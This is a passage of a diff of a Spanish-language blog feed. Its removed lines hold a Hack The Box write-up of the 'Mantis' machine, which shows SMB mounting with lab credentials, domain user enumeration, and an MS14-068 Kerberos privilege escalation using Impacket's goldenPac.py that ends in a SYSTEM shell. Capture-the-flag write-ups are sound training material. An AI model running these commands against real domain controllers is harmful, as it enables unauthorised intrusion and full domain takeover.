-&lt;p&gt;Vemos los recursos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NETLOGON&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYSVOL&lt;/code&gt;. Aqui deberíamos estar pensando en el archivo &lt;strong&gt;Group_._xml&lt;/strong&gt; alojando en la carpeta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYSVOL&lt;/code&gt;; así que primero nos instalamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apt-get install cifs-utils&lt;/code&gt; y creamos una montura en nuestro equipo:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ mount &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; cifs //10.10.10.52/SYSVOL /mnt/smbmnt/ &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'james'&lt;/span&gt;,password&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'J@m3s_P@ssW0rd!'&lt;/span&gt;,domain&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;WORKGROUP,rw
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ya nos creamos la montura y podemos visualizar los recursos de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/mnt/smbmnt&lt;/code&gt; de una formas más rápida con el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tree&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ tree /mnt/smbmnt/
-/mnt/smbmnt/
-└── htb.local
-    ├── DfsrPrivate
-    ├── Policies
-    │   ├── &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;31B2F340-016D-11D2-945F-00C04FB984F9&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-    │   │   ├── GPT.INI
-    │   │   ├── MACHINE
-    │   │   │   ├── Microsoft
-    │   │   │   │   └── Windows NT
-    │   │   │   │       └── SecEdit
-    │   │   │   │           └── GptTmpl.inf
-    │   │   │   └── Registry.pol
-    │   │   └── USER
-    │   └── &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;6AC1786C-016F-11D2-945F-00C04fB984F9&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-    │       ├── GPT.INI
-    │       ├── MACHINE
-    │       │   └── Microsoft
-    │       │       └── Windows NT
-    │       │           └── SecEdit
-    │       │               └── GptTmpl.inf
-    │       └── USER
-    └── scripts
-
-16 directories, 5 files
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;No vemos nada interesante, así que nos quitamos la montura. Podemos probar a listar uusarios del dominio con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rpcclient&lt;/code&gt; proporcionándole las credenciales que tenemos:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ rpcclient &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'james%J@m3s_P@ssW0rd!'&lt;/span&gt; 10.10.10.52 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;enumdomusers&quot;&lt;/span&gt;
-user:[Administrator] rid:[0x1f4]
-user:[Guest] rid:[0x1f5]
-user:[krbtgt] rid:[0x1f6]
-user:[james] rid:[0x44f]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Podemos listar usuarios del dominio. Para tener la información en un formato más bonito y mas claro; nos instalamos la siguiente utilidad:&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://github.com/dirkjanm/ldapdomaindump&quot;&gt;LDAPDomainDump&lt;/a&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ldapdomaindump &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'WORKGROUP\james'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'J@m3s_P@ssW0rd!'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; /var/www/html/ 10.10.10.52
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Connecting to host...
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Binding to host
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Bind OK
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Starting domain dump
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Domain dump finished
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ahora desde el navegador consultado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;localhost&lt;/code&gt; y vemos una serie de archivos, aquellos con extensión &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;html&lt;/code&gt; nos representa la información en un formato amigable sobre el dominio:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-mantis/mantis_dominio.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Como podemos ver, el unico usuario dentro del grupo &lt;strong&gt;Administrators&lt;/strong&gt; es el usuario &lt;strong&gt;Administrator&lt;/strong&gt;; nosotros como el usuario &lt;strong&gt;james&lt;/strong&gt;, estamos en el grupo &lt;strong&gt;Remote Desktop Users&lt;/strong&gt;, pero no tenemos el servicio RDP visible. En este punto, investigando un poco, vemos que exite una vulnerabilidad descrita en &lt;strong&gt;MS14-068&lt;/strong&gt; que nos permitiría elevar privilegios de manera que el usuario &lt;strong&gt;james&lt;/strong&gt; pueda tener los privilegios máximos:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-mantis/mantis_kerberos.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Asi que primero vamos a agregar en nuestro archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; los dominios relacionados con la dirección IP de la máquina:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/hosts
-───────┬────────────────────────────────────────────────────────────────────────
-       │ File: /etc/hosts
-───────┼────────────────────────────────────────────────────────────────────────
-   1   │ &lt;span class=&quot;c&quot;&gt;# Host addresses&lt;/span&gt;
-   2   │ 127.0.0.1  localhost
-   3   │ 127.0.1.1  k4mipc
-   4   │ 10.10.10.52 htb.local mantis.htb.local
-   5   │ 
-   6   │ ::1        localhost ip6-localhost ip6-loopback
-   7   │ ff02::1    ip6-allnodes
-   8   │ ff02::2    ip6-allrouters
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ goldenPac.py htb.local/&lt;span class=&quot;s1&quot;&gt;'james:J@m3s_P@ssW0rd!'&lt;/span&gt;@mantis.htb.local
-Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
-
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; User SID: S-1-5-21-4220043660-4019079961-2895681657-1103
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Forest SID: S-1-5-21-4220043660-4019079961-2895681657
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Attacking domain controller mantis.htb.local
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; mantis.htb.local found vulnerable!
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Requesting shares on mantis.htb.local.....
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Found writable share ADMIN&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Uploading file lPDhopUm.exe
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Opening SVCManager on mantis.htb.local.....
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Creating service MYLV on mantis.htb.local.....
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Starting service MYLV.....
-&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Press &lt;span class=&quot;nb&quot;&gt;help &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;extra shell commands
-Microsoft Windows &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Version 6.1.7601]
-Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2009 Microsoft Corporation.  All rights reserved.
-
-C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&amp;gt;whoami
-nt authority&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem
-
-C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ya ingresamos a la máquina como el usuario &lt;strong&gt;&lt;em&gt;nt authority\system&lt;/em&gt;&lt;/strong&gt; y podemos visualizar las flags (user.txt y root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="Windows" /><category term="Active_Directory" /><category term="SQL" /><category term="File_Misconfiguration" /><category term="Patch_Management" /><summary type="html">Resolución de la máquina Mantis en la plataforma de Hack The Box</summary></entry></feed>
+&lt;p&gt;Ya con esto nos encontramos dentro de la máquina como el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt authority\system&lt;/code&gt; y podemos visualizar las flags (user.txt y root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="Windows" /><category term="Patch_Management" /><summary type="html">Resolución de la máquina Granny en la plataforma de Hack The Box</summary></entry></feed>
